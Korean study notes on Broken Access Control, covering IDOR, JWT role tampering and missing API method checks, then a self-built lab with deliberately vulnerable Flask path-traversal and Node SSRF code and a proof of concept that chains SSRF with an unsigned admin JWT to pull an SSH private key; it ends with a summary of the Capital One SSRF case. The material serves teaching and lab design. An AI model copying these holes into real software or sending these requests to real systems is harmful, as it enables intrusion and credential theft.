# 개념
---
Broken Access Control이란, 잘못된 접근 제어에 의한 취약점이다. 로그인을 한 사용자가 다른 사용자의 계정에 접속하거나 관리자 계정에 접속한 경우, 그리고 로그인조차 되지 않은 사용자가 관리자 계정에 접속한 경우 모두 부서진 접근 제어의 예시이다. 첫 번째 경우는 잘못된 수평 접근 제어이고, 두 번째는 잘못된 수직 접근 제어이다.


![[access_control.png]]

## 취약점 유형

- 일부 사용자(ex. 관리자)에게만 부여되어야 하는 권한을 모든 사용자들에게 부여할 경우  
- URL 파라미터, 쿠키 값 등을 변조하여 인증이 필요한 페이지에 접근하거나 타 사용자의 권한을 사용할 수 있는 경우  
- 사용자 권한으로 로그인 후 관리자 권한으로 권한으로 상승하거나 활동할 수 있는 경우  
- DELET, PUT 등의 API 요청에 대한 접근제어가 누락된 경우  
- 파라미터나 쿠키 등의 요청을 조작해 권한 상승 혹은 타 사용자의 권한을 사용할 수 있는 경우


# Access control 종류
---

![[access_control_type_white.png]]

## 수직 접근 권한

수직 접근 권한은 수직적 권한을 가진 유저 사이의 접근 권한을 뜻한다. 위 그림에서 user A는 관리자 권한을 가진 Admin 유저에 대한 접근 제어 권한이 없지만, Admin은 유저 A/B의 데이터에 접근이 가능하다.
말 그대로 관리자 - 일반 유저 사이의 접근 권한 차이

## 수평 접근 권한

수평 접근 권한은 수평적 권한을 가진 유저 사이의 접근 권한으로, 위의 그림에서 동일한 레벨인 유저 A와 B 사이에도 접근이 제한된다. 즉, 한 사용자가 다른 사용자의 리소스에 접근하지 못하도록 하는 접근 제어 방식이다.

## 문맥 종속 접근 권한

문맥 종속 접근 제한은 사용자의 환경 또는 상황에 따라 접근을 제한한다.
예시 - 사용자가 특정 위치에 있거나 특정 시간대에만 자원에 접근이 가능하도록 함.
즉, 유저 A가 로그인 후 일정 시간이 지나면 이체기능을 사용하지 못하게 하는 것이 문맥 종속 접근 권한을 제어하는 경우에 속한다.

![[context_control_white.png]]


# 공격 기법 예시
---
## IDOR

**개념**
어플리케이션 처리 로직에서 사용자 입력 값이 Object에 직접 참조되는 부분들이 모두 영향받는다. 일반적으로 ID, Username 등 식별 값이 포인트가 되며, 파라미터가 아닌 Static File 등에서도 식별 정보를 기반으로한 데이터 참조가 있는 경우 IDOR의 영향을 받는다.

**예시**
```
GET /profile?id=<user_id> HTTP/1.1
Host: vulnsite.com
Cookie: session=user100
```
내 요청 패킷 캡쳐 후 (user_id가 10이라 가정) 해당 user_id를 11로 변조하였을 때 아래처럼 다른 사용자의 정보가 노출되면 공격에 성공
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 101,
  "username": "victim_user",
  "email": "victim@example.com"
}
```

## jwt 기반 인증 시 서명 검증 미흡

**개념**
인증에 jwt 토큰 사용하는 경우, 토큰의 서명을 검증하지 않아 jwt의 role을 admin으로 바꿨을 때 관리자 권한을 부여하는 경우

> 주의 - 단순히 서명을 제거하거나 none을 허용하는 등은 인증 단계에서 미흡한 것이라 A07에 속함


**예시**
- jwt의 구성
```
<헤더(header)>.<페이로드(payload)>.<서명(signature)>
```

- 페이로드 변조
```
eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.signature
```
1. eyJhbGciOiJIUzI1NiJ9 → `{ "alg": "HS256" }` (서명 알고리즘 정보)
2. eyJyb2xlIjoiYWRtaW4ifQ → `{ "role": "admin" }` (payload, 권한 정보)
3. signature → 일반적 서명

## DELETE, PUT 등 API 접근제어 누락

**개념**
게시글 삭제 같은 것은 본인만 가능해야 하는데 단지 로그인만 확인하고 다른 것은 확인하지 않아서 HTTP 메서드로 요청해도 그대로 서버에서 받아들임

**예시**
```
DELETE /api/posts/55 HTTP/1.1
Host: vulnsite.com
Cookie: session=user101   # 글 작성자가 아닌 사용자
```
```
HTTP/1.1 200 OK
{"ok":true}
```


# 프로젝트 적용
---
> thm 주소:

## Path Traversal

```python
@app.route('/download')
def download():
    path = request.args.get('path', '')
    if not path:
        return Response("Error: Missing 'path' parameter\nUsage: /download?path=<filepath>\n", status=400, mimetype='text/plain')

    try:
        ##########  A01 취약점 -> path traversal 취약점 (경로 검증 없음)
        if os.path.exists(path):
            # 파일인 경우 다운로드
            if os.path.isfile(path):
                return send_file(path, as_attachment=True, download_name=os.path.basename(path))
            else:
                return Response(f"Error: {path} is a directory, not a file\n", status=400, mimetype='text/plain')
        else:
            return Response(f"Error: File not found at path: {path}\n", status=404, mimetype='text/plain')

    except Exception as e:
        return Response(f"Error accessing file: {str(e)}\n", status=500, mimetype='text/plain'
```
- `/download?path=<filename>`를 통해 백업된 파일들을 다운로드할 수 있는 기능이 존재하는 flask 서비스
- path 파라미터에 대한 검증이 없기 때문에 공격자는 임의의 파일 경로를 지정하여 서비스 내 다른 파일들에 접근할 수 있게 된다.
- SSRF랑 결합하여 호스트 내부에서만 접근가능했던 해당 서비스에 접근하여 민감한 백업 파일들을 다운로드하도록 시나리오를 설계함 (ex. ssh deploy 키 등등)

## SSRF

```node.js
// SSRF 취약점: 배너 이미지 미리보기 (URL 검증 없음)
router.get('/preview', vulnerableJwtMiddleware, checkAdmin, (req, res) => {
  const { url } = req.query;
  
  if (!url || typeof url !== 'string') {
    return res.status(400).json({ error: 'Missing url parameter' });
  }
  fetch(url)
    .then(response => {
      // 원본 서비스의 상태 코드와 Content-Type 그대로 전달
      const contentType = response.headers.get('content-type') || 'application/octet-stream';
...

    })
```
- 배너 이미지 미리보기 기능에서 `url` 파라미터에 대한 검증을 하지 않음
- `fetch(url)`을 통해 서버가 검증하지 않은 url파라미터에 대한 값으로 요청을 보냄. 
- 이때, 서버 기준으로 요청을 보내기 때문에, 외부에선 접근 불가한 내부 서비스에 접근이 가능해진다.

## poc

1. 기존엔 접근 불가능한 filtered된 내부 서비스
![[Pasted image 20260108031050.png]]

2. 배너 이미지 미리보기 기능 발견. 이때, 배너 이미지를 `url`로 서버에서 요청하여 가져오고 있음을 확인
![[Pasted image 20260108031243.png]]

3. `/preview` api에서 `url`을 조작하여 내부 파일 공유 서비스로 ssrf 요청 보내기 성공
```
GET /febf809ab643f5f211905c83ba9f6cf5a2659d81469ec9df1e8ab5ca0390f7a5/preview?url=http://localhost:8080/ HTTP/1.1
Host: 192.168.200.135
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: */*
Referer: http://192.168.200.135/febf809ab643f5f211905c83ba9f6cf5a2659d81469ec9df1e8ab5ca0390f7a5?url=http%3A%2F%2F192.168.200.135%2Fassets%2Fuploads%2FEnd-of-Semester_Party.png
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 07 Jan 2026 18:13:58 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
Content-Length: 105

<h1>Club Backup Service</h1>
<p>Status: Read-only (maintenance)</p>
<p>Endpoints: /upload, /download</p>
```

4. 마지막으로, `/download` 엔드포인트로 ssrf 요청하여 ssh 개인키 탈취에 성공하게 된다.
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 07 Jan 2026 18:21:53 GMT
Content-Type: application/octet-stream
Content-Length: 399
Connection: close
X-Powered-By: Express

-----BEGIN OPENSSH PRIVATE KEY-----
...
```

## SSRF 1-day

> capital one 공격 시나리오: 2019년 SSRF 공격으로 인해 미국 금융 기관 ‘캐피탈 원(Capital One)’에서 미국과 캐나다에 걸쳐 약 1억 600만 명의 해킹 피해자가 생기는 사건이 발생하였다.

> [!note]
> 프로젝트에서는 캐피탈 one 사례에서 공격자가 AWS에 접근할 수 있는 AccessKey와 Token의 자격증명을 성공적으로 탈취한 것과 유사하게, host유저의 ssh 개인키를 ssrf로 탈취하여 초기침투를 진행하도록 유도하였다.

![[Pasted image 20260108031510.png]]
- 공격자는 CapitalOne의 홈페이지에 로그인 후 자신의 신용카드 이미지를 본인이 원하는 이미지로 변경할 수 있는 페이지에 접근
- 이때, 신용카드 이미지를 변경했을 때 URL에 AWS S3 버킷 관련 입력 매개변수가 전달되고 있음을 확인
- AWS S3 버킷 링크를 전달하는 `url` 변수에 공격자는 외부 이미지 리소스의 URL 주소를 삽입하였고 해당 이미지가 로드되어 카드 이미지에 적용된 것을 확인.
- 이를 통해 공격자는 해당 변수에 SSRF 취약점이 존재하고 있고 AWS 클라우드를 사용하고 있음을 알아내어 공격하였다.

**취약 코드**
![[Pasted image 20260108031655.png]]
- queryString 변수에서 S3 버킷 URL을 `url=` 변수에 할당 후 `storageService.load` 기능을 이용, `url` 매개 변수를 통해 S3 버킷에서 미리 보기 이미지를 다운로드하게 된다. 
- 마지막으로 `HttpGet` 함수를 이용, 이미지 파일 검색을 위해 Java 기능을 호출하는데 여기서 `url`에 대한 사용자 입력 값 유효성 검사가 이루어지지 않고 있어 SSRF 취약점이 발생하였다.
